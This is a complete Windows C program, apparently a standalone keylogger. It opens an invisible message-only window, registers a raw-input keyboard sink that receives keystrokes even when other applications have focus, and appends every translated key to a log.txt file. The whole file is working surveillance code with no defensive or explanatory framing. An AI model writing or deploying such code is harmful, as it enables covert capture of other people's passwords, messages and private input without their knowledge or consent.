
#define _WIN32_WINNT 0x0501
#include <windows.h>
#pragma warning (disable : 4996)

			 // Definitions
			 int LogKey(HANDLE hLog, UINT vKey);
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow);

// Globals
const char g_szClassName[] = "klgClass";

// Window procedure of our message-only window
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	static HANDLE hLog;
	UINT dwSize;
	RAWINPUTDEVICE rid;
	RAWINPUT *buffer;

	switch (msg)
	{
	case WM_CREATE:
		// Register a raw input device to capture keyboard input
		rid.usUsagePage = 0x01;
		rid.usUsage = 0x06;
		rid.dwFlags = RIDEV_INPUTSINK;
		rid.hwndTarget = hwnd;

		if (!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
		{
			MessageBox(NULL, "Registering raw input device failed!", "Error!",
				MB_ICONEXCLAMATION | MB_OK);
			return -1;
		}

		// open log.txt
		hLog = CreateFile("log.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL,
			OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hLog == INVALID_HANDLE_VALUE)
		{
			MessageBox(NULL, "Creating log.txt failed!", "Error",
				MB_ICONEXCLAMATION | MB_OK);
			return -1;
		}

		// append
		SetFilePointer(hLog, 0, NULL, FILE_END);
		break;

	case WM_INPUT:
		// request size of the raw input buffer to dwSize
		GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
			sizeof(RAWINPUTHEADER));

		// allocate buffer for input data
		buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);

		if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
			sizeof(RAWINPUTHEADER)))
		{
			// if this is keyboard message and WM_KEYDOWN, log the key
			if (buffer->header.dwType == RIM_TYPEKEYBOARD
				&& buffer->data.keyboard.Message == WM_KEYDOWN)
			{
				if (LogKey(hLog, buffer->data.keyboard.VKey) == -1)
					DestroyWindow(hwnd);
			}
		}

		// free the buffer
		HeapFree(GetProcessHeap(), 0, buffer);
		break;

	case WM_DESTROY:
		if (hLog != INVALID_HANDLE_VALUE)
			CloseHandle(hLog);
		PostQuitMessage(0);
		break;

	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow)
{
	WNDCLASSEX wc;
	HWND hwnd;
	MSG msg;

	// register window class
	ZeroMemory(&wc, sizeof(WNDCLASSEX));
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.lpfnWndProc = WndProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = g_szClassName;

	if (!RegisterClassEx(&wc))
	{
		MessageBox(NULL, "Window Registration Failed!", "Error!",
			MB_ICONEXCLAMATION | MB_OK);
		return 0;
	}

	// create message-only window
	hwnd = CreateWindowEx(
		0,
		g_szClassName,
		NULL,
		0,
		0, 0, 0, 0,
		HWND_MESSAGE, NULL, hInstance, NULL
		);

	if (!hwnd)
	{
		MessageBox(NULL, "Window Creation Failed!", "Error!",
			MB_ICONEXCLAMATION | MB_OK);
		return 0;
	}

	// the message loop
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return msg.wParam;
}

int LogKey(HANDLE hLog, UINT vKey)
{
	DWORD dwWritten;
	BYTE lpKeyboard[256];
	char szKey[32];
	WORD wKey;
	char buf[32];
	int len;

	// Convert virtual-key to ascii
	GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
	GetKeyboardState(lpKeyboard);

	len = 0;
	switch (vKey)
	{
	case VK_BACK:
		len = wsprintf(buf, "[BP]");
		break;
	case VK_RETURN:
		len = 2;
		strcpy(buf, "\r\n");
		break;
	case VK_SHIFT:
		break;
	default:
		if (ToAscii(vKey, MapVirtualKey(vKey, 0), lpKeyboard, &wKey, 0) == 1)
			len = wsprintf(buf, "%c", (char)wKey);
		else if (GetKeyNameText(MAKELONG(0, MapVirtualKey(vKey, 0)), szKey, 32) > 0)
			len = wsprintf(buf, "[%s]", szKey);
		break;
	}

	// Write buf into the log
	if (len > 0)
	{
		if (!WriteFile(hLog, buf, len, &dwWritten, NULL))
			return -1;
	}

	return 0;
}
